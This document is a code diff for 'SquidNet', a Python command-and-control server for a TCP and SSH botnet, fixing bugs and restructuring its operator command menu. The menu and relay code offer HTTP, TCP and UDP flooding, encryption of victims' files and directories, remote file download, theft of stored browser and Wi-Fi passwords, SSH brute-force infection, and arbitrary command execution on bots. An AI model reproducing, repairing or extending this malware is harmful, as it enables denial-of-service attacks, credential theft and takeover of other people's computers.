@@ -143,7 +143,7 @@ class Botnet:
         def __init__(self, msg=f"Configured Password is the the same as one in server txt file!"):
             """Little Error for the password configuration."""
             self.msg = msg
-            super().__init__(NotSamePassException)
+            super().__init__(self.msg)
     def __init__(self, ip, port, name, passw, key, passwfile, ngroklink=None, ngrokport=None):
         """Initiation of the main script. Definition of socket server, ngrok hosts, logging, etc
         are created. There are also definition of variables that are vital to the overall script
@@ -197,6 +197,53 @@ class Botnet:
         self.listener = threading.Thread(target=self.listen)
         self.listener.start()
         self.logo()
+        self.savefile = False
+        self.welcomemsg = """
+[(SERVER)]: List of Commands:
+[+] !help                                - Displays this message.
+
+[+] Commands for TCP Botnet:
+
+[+] !httpflood [website] [delay]         - Denial Of Services the website provided.
+[+] !tcpflood [ip] [port] [delay] [size] - Floods the target with TCP Packets.
+[+] !udpflood [ip] [port] [delay] [size] - Floods the target with UDP Packets.
+[+] !openfile [filename]                 - Opens a file in the bot working directory.
+[+] !changedir [dir]                     - Changes the working directory of the Bot.
+[+] !rmdir [folder]                      - Removes a folder in the bot working directory.
+[+] !rmfile [file]                       - Removes a file in the bot working directory.
+[+] !encfile [file]                      - Encrypts a provided file in the bot working directory
+[+] !decfile [file]                      - Decrypts a provided file in the bot working directory
+[+] !viewfilecontent [file]              - Gets the content of the files provided.
+[+] !dwnldfile [src] [file]              - Downloads a file from the internet onto the bot computer.
+[+] !mkdir [dir]                         - Makes a folder in the bot current directory.
+[+] !gotowebsite [url]                   - Takes the bot to the provided website.
+[+] !mkfile [filename]                   - Creates a file in the bot working directory.
+[+] !editfile [file]                     - Opens a file in writing mode for the bots.
+[+] !stopedit                            - Closes file editor on bots and returns to normal.
+[+] !encdir                              - Encrypts all files in the bot working directory
+[+] !decdir                              - Decrypts all files in the bot working directory
+[+] !botcount                            - Gets the amount of connected bots.
+[+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.
+[+] !changedirdesktop                    - Sets the bot working directory to their Desktop.
+[+] !listdir                             - Lists some of the files in the bot working directories(recommended for small botnets)
+[+] !resettoken                          - Resets the token and changes it to a new token
+[+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.
+[+] !getip                               - Gets the IP of the bots
+[+] !getwifi                             - Obtains the wifi names and passwords of the bots(windows only)
+[+] !savefile                            - Obtains a file from the bots directory.
+[+] !getcwd                              - Gets the bots working directory.
+[+] !getos                               - Gets the OS Of the bots.
+[+] !getpasswords                        - Gets the stored browser passwords of the bots.
+[+] !rickroll                            - Rick Rolls the Bots.     
+
+[+] Commands for SSH Botnet:
+
+[+] !infect [ip] [user]                  - Brute forces login for provided ip and username
+[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password
+[+] !listsshbots                         - Lists all SSH Bots
+
+[+] Any other commands will be made into cmd commands.
+                """
         item = f"\n[(SERVER)]: Server started: {datetime.datetime.today()}\n[(SERVER)]: Successfully started server on: {self.ngroklink}:{self.ngrokport}\n[(SERVER)]: Listening for connections.....\n[(SERVER)]: Encryption key used: {self.key}"
         self.log(item)
         print(f"\n[+] Hosting Server at {self.ngroklink}:{self.ngrokport}")
@@ -212,14 +259,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _             __   ___  
- / ____|           (_)   | | \ | |    | |           / /  / _ \ 
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_ | | | |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \| | | |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | |_| |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)___/ 
-           | |                                                 
-           |_|                                                                                                                              
+  _____             _     _ _   _      _             __   _____ 
+ / ____|           (_)   | | \ | |    | |           / /  | ____|
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_  | |__  
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \ |___ \ 
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | ___) |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)____/ 
+           | |                                                  
+           |_|                                                                                                                        
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -282,7 +329,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             self.admin_name = username_password[0]
             self.admin_password = username_password[1]
             if hashlib.md5(self.admin_password.encode()).hexdigest() != hashlib.md5(
-                    self.passw.encode()).hexdigest() or admin_name != self.name:
+                    self.passw.encode()).hexdigest() or self.admin_name != self.name:
                 raise self.NotSamePassException
             admin_file.close()
         except:
@@ -360,53 +407,6 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         recieve packets."""
         admin = False
         isbot = False
-        self.savefile = False
-        self.welcomemsg = """
-[(SERVER)]: List of Commands:
-[+] !help                                - Displays this message.
-
-[+] Commands for TCP Botnet:
-
-[+] !httpflood [website] [delay]         - Denial Of Services the website provided.
-[+] !tcpflood [ip] [port] [delay] [size] - Floods the target with TCP Packets.
-[+] !udpflood [ip] [port] [delay] [size] - Floods the target with UDP Packets.
-[+] !openfile [filename]                 - Opens a file in the bot working directory.
-[+] !changedir [dir]                     - Changes the working directory of the Bot.
-[+] !rmdir [folder]                      - Removes a folder in the bot working directory.
-[+] !rmfile [file]                       - Removes a file in the bot working directory.
-[+] !encfile [file]                      - Encrypts a provided file in the bot working directory
-[+] !decfile [file]                      - Decrypts a provided file in the bot working directory
-[+] !viewfilecontent [file]              - Gets the content of the files provided.
-[+] !dwnldfile [src] [file]              - Downloads a file from the internet onto the bot computer.
-[+] !mkdir [dir]                         - Makes a folder in the bot current directory.
-[+] !gotowebsite [url]                   - Takes the bot to the provided website.
-[+] !mkfile [filename]                   - Creates a file in the bot working directory.
-[+] !editfile [file]                     - Opens a file in writing mode for the bots.
-[+] !stopedit                            - Closes file editor on bots and returns to normal.
-[+] !encdir                              - Encrypts all files in the bot working directory
-[+] !decdir                              - Decrypts all files in the bot working directory
-[+] !botcount                            - Gets the amount of connected bots.
-[+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.
-[+] !changedirdesktop                    - Sets the bot working directory to their Desktop.
-[+] !listdir                             - Lists some of the files in the bot working directories(recommended for small botnets)
-[+] !resettoken                          - Resets the token and changes it to a new token
-[+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.
-[+] !getip                               - Gets the IP of the bots
-[+] !getwifi                             - Obtains the wifi names and passwords of the bots(windows only)
-[+] !savefile                            - Obtains a file from the bots directory.
-[+] !getcwd                              - Gets the bots working directory.
-[+] !getos                               - Gets the OS Of the bots.
-[+] !getpasswords                        - Gets the stored browser passwords of the bots.
-[+] !rickroll                            - Rick Rolls the Bots.     
-
-[+] Commands for SSH Botnet:
-
-[+] !infect [ip] [user]                  - Brute forces login for provided ip and username
-[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password
-[+] !listsshbots                         - Lists all SSH Bots
-
-[+] Any other commands will be made into cmd commands.
-        """
         while True:
             try:
                 msg = c.recv(65500)
@@ -550,7 +550,9 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                         elif msg.startswith("!listsshbots"):
                             c.send(f"[(SERVER)]: Connected SSH Bots: {self.display_bots}".encode())
                             self.log(f"[(SERVER)---->({hostname})]: Connected SSH Bots: {self.display_bots}")
-                        self.send_ssh(msg)
+                        if len(self.ssh_bots) != 0:
+                            sendtossh = threading.Thread(target=self.send_ssh, args=(msg,))
+                            sendtossh.start()
                         for connect in self.conn_list:
                             if connect in self.admin_conn:
                                 pass
@@ -588,7 +590,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                             except:
                                 file.write(msg)
                             file.close()
-                            filemsg = f"\n[({hostname})]: Saved contents of {botfile} into {filenames}"
+                            filemsg = f"\n[({hostname})]: Saved contents of {self.botfile} into {filenames}"
                             print(filemsg)
                             self.log(filemsg)
                             file_created = False
@@ -764,7 +766,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                     self.usage()
                 elif self.instruction.startswith('!savefile'):
                     instruction_split = self.instruction.split()
-                    botfile = instruction_split[1]
+                    self.botfile = instruction_split[1]
                     self.savefile = True
                     print("[+] Savefile commenced")
                 elif self.instruction.startswith("!genadminscript"):
@@ -851,20 +853,15 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                     print("""
 [+] New Features In the SquidNet:
 
-[+] - Fixed Typo in Option-Parsing Message(affect-->effect).
-[+] - Added TCP Flooding
-[+] - Added UDP Flooding
-[+] - Added Bot file editing.
-[+] - Added Bot file creation.
 [+] - Added Web-Interface(http://127.0.0.1:8080)!
 [+] - Fixed Variable bug in regular SSH Login Function(passw-->password)
 [+] - Optimized the code a little.
-[+] - Fixed bug that kicked admins on connection.
-[+] - Added Rick Roll command.
+[+] - Fixed NotSamePassException Errors.
                     """)
                 if self.instruction != "!clear":
-                    sendtossh = threading.Thread(target=self.send_ssh, args=(self.instruction,))
-                    sendtossh.start()
+                    if len(self.ssh_bots) != 0:
+                        sendtossh = threading.Thread(target=self.send_ssh, args=(self.instruction,))
+                        sendtossh.start()
                 self.log(f"\n[(SERVER)---->(ADMINS)]: Sent '{self.instruction}' to the bots.")
                 for conn in self.conn_list:
                     try:
